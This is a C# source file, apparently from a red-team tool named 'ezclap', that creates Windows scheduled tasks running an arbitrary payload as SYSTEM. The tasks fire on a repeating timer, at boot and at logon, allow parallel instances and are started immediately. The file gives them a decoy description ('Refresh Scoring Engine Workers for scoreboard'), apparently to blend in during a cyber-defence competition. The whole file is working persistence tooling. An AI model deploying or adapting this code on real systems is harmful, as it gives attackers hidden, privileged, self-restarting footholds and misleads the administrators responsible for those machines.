﻿using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace ezclap
{
	public class AddScheduledTask
    {

        /*
         * Description: Create scheduled task with SYSTEM privilege, with a specific payload.
         * 
         * Params:
         *  - (string) scheduledTaskName    = Name of the scheduled Task to be created 
         *  - (string) payload              = Payload to be executed when the scheduled Task runs 
         *  - (int)    often                = How often the scheduled task will run in an interval 
         * 
         */
        public AddScheduledTask(string[] scheduledTaskNames, string[] payload, double often)
        {
            Random rnd = new Random();
            Array.ForEach(scheduledTaskNames,element =>  Initialize(element, payload[rnd.Next(0,payload.Length-1)], often));
        }

		public static void Initialize(string scheduledTaskName, string payload, double often)
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.Principal.RunLevel = TaskRunLevel.Highest;
                // public TaskInstancesPolicy MultipleInstances { get; set; } 
                // Needed for creating multiple instances of the payload 
                td.Settings.MultipleInstances = TaskInstancesPolicy.Parallel;
                td.RegistrationInfo.Description = "Refresh Scoring Engine Workers for scoreboard";
                

                // Add Time Trigger interval for Scheduled task.
                TimeTrigger tt = new TimeTrigger();
                tt.Repetition.Interval = TimeSpan.FromMinutes(often);
                td.Triggers.Add(tt);

                // Add Boot Trigger. SchTask will get triggered when the system boots up 
                BootTrigger bt = new BootTrigger();
                td.Triggers.Add(bt);

                // Add Logon Trigger. Schetask will get triggered when a user logs in
                LogonTrigger lt = new LogonTrigger();
                td.Triggers.Add(lt);

                // Path to action, Arguments, working directory 
                td.Actions.Add(new ExecAction(payload, null, null));

                // Create Scheduled Task with names and run 
                ts.RootFolder.RegisterTaskDefinition(scheduledTaskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
                TaskService.Instance.GetTask(scheduledTaskName).Run();
            }
        }
    }
}
